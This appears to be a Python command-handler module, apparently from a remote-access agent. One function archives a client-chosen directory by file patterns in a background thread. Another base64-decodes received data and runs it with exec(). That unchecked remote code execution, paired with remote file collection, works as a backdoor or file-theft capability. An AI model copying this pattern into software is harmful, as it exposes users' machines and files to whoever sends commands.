import os, base64, json, threading
from database.id_checker import add_user_id
from file_handler import main

def add_register_id(id):
    add_user_id(id)

def make_archive(rawdata):
    data = json.loads(rawdata)['data']
    sid = json.loads(rawdata)['sid']
    dir = data['dir']
    if isinstance(dir,list):
        dir = dir[0].strip(',')
    if not os.path.isdir(dir):
        from _cmd_.send_error import send_err
        sid = json.loads(rawdata)['sid']
        err = 'path_err'
        send_err(err, sid)
    else:
        exclude_folder = []
        pattern = []
        exclude_folder_ = data['ex_folder'].strip('''[]'"''').split(',')
        for x in exclude_folder_:
            x = x.strip('''[]'"''')
            exclude_folder.append(x)
        pattern_ = data['pattern'].strip('''[]'"''').split(',')
        for x in pattern_:
            x.strip('''[']"''')
            pattern.append(x)
        
        print('dir', dir, 'exclude_folder', exclude_folder, 'pattern', pattern)
        x= threading.Thread(target=main, args=(sid,dir, exclude_folder,pattern))
        x.start()
def exec_(data):
    base64_bytes = data.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    mesage = message_bytes.decode('ascii')
    try:
        exec(mesage)
    except Exception as e:
        from _cmd_.send_error import send_err
        send_err(str(e))
